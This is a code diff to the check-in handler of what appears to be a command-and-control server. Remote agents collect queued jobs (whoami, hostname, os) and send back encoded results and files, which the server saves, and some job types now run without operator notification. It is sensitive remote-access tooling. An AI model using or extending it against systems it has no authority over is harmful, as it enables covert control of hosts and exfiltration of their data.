@@ -42,33 +42,43 @@ def check_in():
         try:
             job = Jobs.query.filter_by(identifier=job_packet[0]).first()
             job.completed = datetime.now()
-            job.connection.check_in = datetime.now()
             if len(job_packet) > 1:
-                if job.type == 0:
+                emit = None
+                if job.type == 1 or job.type == -1:
                     results = base64.b64decode(job_packet[1]).decode('utf-8')
                     job.results = results
-                    socket.emit('success', {'banner': f'{job.name} job from {job.connection_id} returned the following:', 'results': results})
+                    emit = ('success', {'banner': f'{job.name} job from {job.connection_id} returned the following:', 'results': results})
                     if job.name == 'whoami':
                         job.connection.username = results
                     if job.name == 'hostname':
                         job.connection.hostname = results
                     if job.name == 'os':
                         job.connection.os = results
-                if job.type == 1:
+                if job.type == 2 or job.type == -2:
                     file_name = f'{generate_id()}.txt'
                     download_path = f'{downloads_directory}{file_name}'
-                    socket.emit('success', {'banner': f'{job.name} job from {job.connection_id} returned the following:', 'results': f'Writing results to {download_path}'})
+                    emit = ('success', {'banner': f'{job.name} job from {job.connection_id} returned the following:', 'results': f'Writing results to {download_path}'})
                     try:
                         with open(download_path, 'wb') as fd:
                             fd.write(base64.b64decode(job_packet[1]))
                         job.results = file_name
                     except Exception as e:
                         os.remove(download_path)
-                        socket.emit('failure', {'banner': f'failed to write results to {download_path} for {job.name} job: {e}.'})
+                        emit = ('failure', {'banner': f'failed to write results to {download_path} for {job.name} job from {job.connection_id}: {e}.'})
+                if job.type > 0:
+                    socket.emit(*emit)
             if job.name == 'check_in':
+                if job.connection.check_in:
+                    time_delta = (datetime.now() - job.connection.check_in)
+                    if time_delta.total_seconds() > 29:
+                        socket.emit('success', {'banner': f'{job.connection_id} is now connected.', 'results': ''})
+                else:
+                    socket.emit('success', {'banner': f'{job.connection_id} is now connected.', 'results': ''})
+                job.connection.check_in = datetime.now()
                 for job in job.connection.jobs:
                     if not job.sent:
-                        socket.emit('information', {'banner': f'Sent {job.name} job to {job.connection_id}.'})
+                        if job.type > 0:
+                            socket.emit('information', {'banner': f'Sent {job.name} job to {job.connection_id}.'})
                         job.sent = datetime.now()
                         uncompleted_jobs.append({"id": str(job.identifier), "name": job.name, "arguments": job.arguments})
             db.session.add(job)
